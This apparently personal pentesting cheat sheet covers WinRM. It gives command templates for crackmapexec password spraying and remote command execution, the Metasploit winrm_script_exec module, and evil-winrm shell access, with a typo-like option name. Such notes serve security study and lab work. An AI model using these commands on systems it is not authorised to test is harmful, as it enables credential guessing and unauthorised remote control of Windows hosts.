
Related to [[Metasploit]] and [[Pass-The-Hash Attacks]]

Windows Remote Management Protocolx

Facilitates remote access to systems via HTTP/HTTPS

We can confirma port is running WinRM with crackmapexec

``` bash
crackmapexec winrm [IP] -u [userlist/user: administrator] -p [wordlist_passwords]
```

We can then run commands with:

``` bash
crackmapexec winrm [IP] -u [user] -p [password] -x "[command]"
```


We can also use metasploit:

``` bash
use /exploit/windows/winrm/winrm_script_exec
```

(you should set  force VPS to true)

We may NOT get a meterpreter session in which case we need to keep trying

We can also use evil-winrm

``` bash
evil-winrm.rb -u [user] -p '[password]' -i [IP]
```